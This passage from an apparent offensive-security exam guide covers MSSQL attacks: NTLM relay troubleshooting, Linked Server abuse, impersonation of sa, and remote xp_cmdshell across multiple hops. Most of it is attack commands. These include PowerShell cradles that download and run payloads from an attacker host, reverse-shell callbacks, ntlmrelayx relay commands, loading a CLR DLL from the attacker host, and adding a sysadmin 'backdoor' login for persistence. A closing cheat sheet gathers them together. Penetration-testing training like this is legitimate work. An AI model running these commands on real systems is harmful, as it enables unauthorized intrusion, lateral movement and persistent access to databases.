3. The SQL host cannot reach `LHOST` (return traffic blocked by a firewall) → use Ligolo-ng on a reachable host to open `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`, and change the trigger target from `\\LHOST\` to `\\<ligolo listen address>\` (details in the M08 `Tunneling` section).
4. Responder and ntlmrelayx fight over the port / another host in the environment is squatting on 445 → run only one service; change the Responder interface or use `-w`/`-r` for precise control; make sure you are not hanging both Responder and relayx on 445.
5. The relayed command is blocked by AV (the payload is killed on landing) → switch to in-memory loading (`-c "powershell ..."` with a direct IEX download string), staged execution, or a different encoding (M05/M07 methods).

**Exam / OPSEC notes**:
- Responder / ntlmrelayx listening on 445 briefly disturbs normal SMB traffic on that segment; on an exam network be careful not to pull the DC's authentication in as well and create "account lockout" noise — trigger right after `responder -I <iface>` and finish as fast as you can.
- Trigger actions such as `xp_dirtree` show up in the SQL Server error log/Profiler; fine in a lab, assess first in production.
- The identity you get from a relay is **not** an interactive credential: when moving laterally with it prefer SMB/service protocols (wmiexec, psexec) and do not waste time trying RDP (unless that account is in Remote Desktop Users).
- Record explicitly whether the target account counts as a "sensitive account" (domain admin/service account); the privileges a successful relay gives you are decided by the local group membership of the relayed account on the target.

---

## Scenario 45: Linked Server can query, but remote execution fails

**Situation**: We can already reach instance A, and it has a Linked Server pointing at instance B (or even C); querying B's data from A succeeds, but anything involving **remote execution** (`EXEC ... AT B`, `xp_cmdshell` on B, cross-server RPC) fails. The cause usually sits in one of three places: the **mapped login** on B having low privileges, **RPC/RPC Out** on A→B not being enabled, and the **privilege configuration on the two ends not matching** (for example A is sysadmin but maps to B as only public).

**Assumptions**:
- A valid login on instance A (SQL auth or Windows auth), at least `public` on A, quite possibly lower.
- On A you can already see a Linked Server named `LINKED_B` (this note uses `TARGET2` for its host), and `SELECT` works (otherwise fix connectivity/credentials first; that is not this scenario's failure point).
- This scenario calls A the "source instance", B the "one hop" and C the "two hop" (A→B→C).
- Have ready: `impacket-mssqlclient` (Linux) or PowerUpSQL/SQLRecon (Windows), and `m11-linked-server-queries.sql`.

**Prepare (attacker side)**:
1. Connect to the source instance A:
   ```bash
   impacket-mssqlclient USER:PASS@A_HOST        # SQL auth
   impacket-mssqlclient DOMAIN/USER:PASS@A_HOST -windows-auth   # Windows auth
   ```
2. Confirm you can list linked servers (SQL Server 2008+ uses `sys.servers`):
   ```sql
   SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled,
          is_data_access_enabled, is_remote_provider_enabled
   FROM sys.servers;
   ```
   Expect at least one row with `is_linked = 1`.
3. Get into the "short payload" mindset: long commands executed through a Linked Server very easily break on quotes/length; make the long content a **URL download** (`http://LHOST/x.ps1`) and let the remote side run only the shortest command. Keep the payload file in the attacker's HTTP directory; see the notes in the script templates.

**Procedure**:

1. Pin down the exact boundary of "can query, cannot execute" — test item by item and troubleshoot in order:
   ```sql
   -- (a) single-hop query: does it work?
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');
   -- (b) EXEC AT remote execution: what is the error when it fails?
   EXEC ('SELECT @@SERVERNAME') AT TARGET2;
   -- (c) four-part name query (needs remote data access + metadata; usually unavailable on A by default)
   SELECT * FROM [TARGET2].[master].[dbo].[syslogins];   -- if you get an OLE DB provider error → troubleshoot data access
   ```
   Common errors, quick reference:
   - `SQL Server blocked access to ... 'Ad Hoc Distributed Queries'` / `OLE DB provider "SQLNCLI11" ... cannot be used for distributed queries` → `data access`/openquery configuration problem (step 4).
   - `The RPC server is unavailable` / `Server 'TARGET2' is not configured for RPC` → `rpc out` not enabled (step 3).
   - `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'` → on a **double hop** the middle server cannot delegate (see failure branch 3).
   - Remote execution succeeds but `xp_cmdshell` reports a permission error → the remote mapped account is not sysadmin (step 5).

2. Check the **remote identity and privileges** (see who is really executing on B):
   ```sql
   EXEC ('SELECT SYSTEM_USER AS remote_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT TARGET2;
   -- empty/guest means it goes through the mapped guest login → extremely low privileges
   ```
   Check whether B can see deeper links itself (to pave the way for multi-hop):
   ```sql
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled, is_linked FROM sys.servers');
   ```

3. **Handle the RPC configuration** (RPC Out = allows calling the remote through `EXEC ... AT`):
   ```sql
   -- view A's RPC settings for B (SQL Server 2008+)
   SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name='TARGET2';
   -- if it is 0 and we have sysadmin (or CONTROL SERVER / ALTER ANY LINKED SERVER), turn it on:
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   -- without sysadmin this is a hard limit: either find an impersonatable sysadmin (Invoke-SQLAuditPrivImpersonateLogin), or give up on EXEC AT and fall back to read-only OPENQUERY queries
   ```
   Note: `sp_serveroption` is a server-level setting, so low privileges usually cannot change it; this is one of the classic blockers in this scenario. Try `EXECUTE AS LOGIN='sa'` first (if it is impersonatable):
   ```sql
   EXECUTE AS LOGIN = 'sa';
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   REVERT;
   ```

4. When you need `OPENQUERY`, confirm A allows distributed queries against B (data access):
   ```sql
   EXEC sp_serveroption 'TARGET2', 'data access', 'true';   -- also needs sufficient privileges
   ```

5. **Enable xp_cmdshell on B and execute** (prerequisite: the identity mapped on B is sysadmin, or you can impersonate B's sysadmin from A):
   ```sql
   EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT TARGET2;
   EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;
   ```
   Enable OLE remotely (backup execution channel):
   ```sql
   EXEC ('EXEC sp_configure ''Ole Automation Procedures'',1; RECONFIGURE;') AT TARGET2;
   ```

6. **Single-hop command execution / get a shell** (leave the long command to the download; the remote only runs a short one):
   ```sql
   -- way 1: a short xp_cmdshell command directly
   EXEC ('EXEC master..xp_cmdshell ''whoami /all''') AT TARGET2;
   -- way 2: have B download and run it (B needs outbound access to LHOST)
   EXEC ('EXEC master..xp_cmdshell ''powershell -nop -w hidden -c "iex(iwr http://LHOST/run.ps1)"''') AT TARGET2;
   -- way 3: the whole thing in base64 (fewest quotes):
   EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
   ```
   For a callback: start `nc -nvlp LPORT` on the attacker first, and put run.ps1 in the HTTP directory (its content = download and execute a reverse shell).

7. **Multi-hop (A→B→C) template** — the core is "send one EXEC from A to B that makes B send another EXEC to C":
   ```sql
   -- enumerate C: look at B's links through B
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled FROM sys.servers');
   -- execute on C (the whole B→C EXEC AT is wrapped as a string handed to B)
   EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;
   -- multi-hop query: all quotes in the inner OPENQUERY double
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT * FROM OPENQUERY("TARGET3", ''SELECT @@SERVERNAME AS srv'')');
   ```
   Quote rules (extremely easy to get wrong):
   - In the outermost SQL: strings use single quotes; a single quote inside a string → doubled `''`.
   - `OPENQUERY` server names use double quotes; inside an outer string the double quotes stay as they are, but when an outer **PowerShell / command line** layer wraps it again, escape per that shell's rules.
   - Full templates: `m11-linked-server-queries.sql` (with the quote levels annotated).

8. Two common follow-ups once you have a sysadmin session on B:
   - Run OS commands on B (the ways above).
   - Add a new login on B and make it sysadmin (if you want to connect to B directly later and skip A's long chain):
     ```sql
     EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT TARGET2;
     EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT TARGET2;
     -- then connect directly: impacket-mssqlclient backdoor:P@ssw0rd!@B_HOST
     ```
     In the exam, decide whether to run persistence actions like "add a login" based on the objective; confirm the goal first.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m11-linked-server-queries.sql` | The full link enumeration / single-hop / multi-hop / `EXEC ... AT` template set (with quote annotations) | replace `TARGET2`/`TARGET3`, etc. |
| `m11-powerupsql-templates.ps1` | `Get-SQLServerLinkCrawl`, `Invoke-SQLAudit`, PowerShell-side wrappers for enabling xp_cmdshell | `-Instance A_HOST` |
| `m11-sqlrecon-templates.ps1` | SQLRecon's link modules for comparison (links / linkquery / linkcmd) | `/h:A_HOST /m:linkquery` |
| `m11-responder-relay-sql.sh` | The cleanup path when B is the "relay target" | `TARGET` |

**Validation**:
- `EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` returns B's hostname and the remote user → RPC works.
- The `xp_cmdshell 'whoami'` from step 5 returns something like `nt service\mssql$...` or `DOMAIN\svc_sql` → remote command execution works.
- Multi-hop execution returns C's `whoami` → the chain is complete.
- The reverse-shell listener receives a connection.

**Failure branches and alternatives**:
1. `EXEC ... AT` reports "not configured for RPC" → try running `sp_serveroption 'TARGET2','rpc out','true'` as an impersonatable sysadmin (`EXECUTE AS LOGIN='sa'`); if you cannot impersonate, switch to the read-only `OPENQUERY` path or hunt for new credentials; without RPC Out you **cannot** call stored procedures/xp_cmdshell remotely — data queries only.
2. The remote side can execute but is not sysadmin (`xp_cmdshell` denied) → do **login enumeration + impersonation** on B: `EXEC ('SELECT name FROM sys.server_principals WHERE type IN (''U'',''S'')') AT TARGET2`; use PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit` to find a login you can impersonate into sysadmin, then execute.
3. On multi-hop you get `NT AUTHORITY\ANONYMOUS LOGON` / a Kerberos delegation error → the B→C link needs "credential delegation" and double-hop EXEC is blocked on some versions/configurations; alternatives: use four-part names for **data**-level access `SELECT * FROM [TARGET2]...[sysservers]`, or pull C's connection information out of B and **connect to C directly** (if the port is reachable), or take full control of B and add credentials there to connect to C directly.
4. Command too long / too many quotes causing syntax errors → convert everything to "download + execute" short commands: let the remote run only `powershell -enc <shortBASE64>` or `curl http://LHOST/x`; generate the BASE64 locally with `iconv -t UTF-16LE | base64 -w 0` (the command itself then contains no quotes or spaces, which is the most reliable form).
5. `OPENQUERY` reports OLE DB / distributed queries disabled → you need `data access=true` (needs sysadmin); if you do not have it, pull B's data back to A with plain `SELECT` loops and do not chase remote in-place execution.
6. A itself is low-privilege with no impersonatable sysadmin → go back to scenario 44's "trigger outbound authentication + relay" path and lure A's SQL service account onto another target.

**Exam / OPSEC notes**:
- **Quote escaping is the biggest point-loser**: when you write a remote string, walk through "which layer am I in" in your head; copy from the script templates and change only the server name — do not hand-write the nesting.
- Enabling `xp_cmdshell` remotely attracts DBA/EDR-style monitoring immediately (SQL Server has audit events for it); after the validation step you can consider turning it back off if the objective does not need it: `EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`.
- Adding a backdoor login with `sp_addlogin` is a persistence action: in the exam use it only when the objective explicitly requires it or in a normally authorized environment, and record it so you can clean up afterwards.
- First work out whether this scenario gives you **data access** or **server control**: many objectives only need you to read one table in B over the Linked Server (in which case do not mess with xp_cmdshell), and least privilege satisfies the objective first.

---

## Module cheat sheet

| Goal | Command (example) |
|---|---|
| Connect SQL (SQL auth) | `impacket-mssqlclient USER:PASS@TARGET` |
| Connect SQL (Windows auth) | `impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth` |
| Check sysadmin | `SELECT IS_SRVROLEMEMBER('sysadmin');` |
| xp_cmdshell status | `SELECT name,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';` |
| Enable xp_cmdshell | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
| Trigger outbound auth (capture/relay) | `EXEC master..xp_dirtree '\\LHOST\share';` |
| Responder capture | `sudo responder -I eth0` |
| Crack NTLMv2 with hashcat | `hashcat -m 5600 hash.txt rockyou.txt` |
| Relay to an SMB target | `impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET -c "powershell -enc <B64>"` |
| List Linked Servers | `SELECT name,is_linked,is_rpc_out_enabled FROM sys.servers;` |
| Single-hop query | `SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME');` |
| Single-hop exec | `EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;` |
| Enable remote RPC Out | `EXEC sp_serveroption 'TARGET2','rpc out','true';` |
| Multi-hop exec (A→B→C) | `EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;` |
| Audit/impersonate (PowerUpSQL) | `Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit` |
| CLR exec (SQLRecon) | `SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:clr /dll:http://LHOST/Warhead.dll /function:Main` |
| Short BASE64 (local) | `echo -en 'IEX (...)' \| iconv -t UTF-16LE \| base64 -w 0` |

## Related script list

| File | Purpose |
|---|---|
| `m11-linked-server-queries.sql` | Linked Server enum / single-hop / multi-hop / EXEC AT templates and quote escaping |
| `m11-powerupsql-templates.ps1` | PowerUpSQL discovery / enum / audit / impersonate / exec / CLR templates |
| `m11-sqlrecon-templates.ps1` | SQLRecon module counterparts (info / impersonate / xpcmd / olecmd / clr / links) |
| `m11-responder-relay-sql.sh` | Responder / ntlmrelayx one-shot flow + prints the SQL trigger commands |
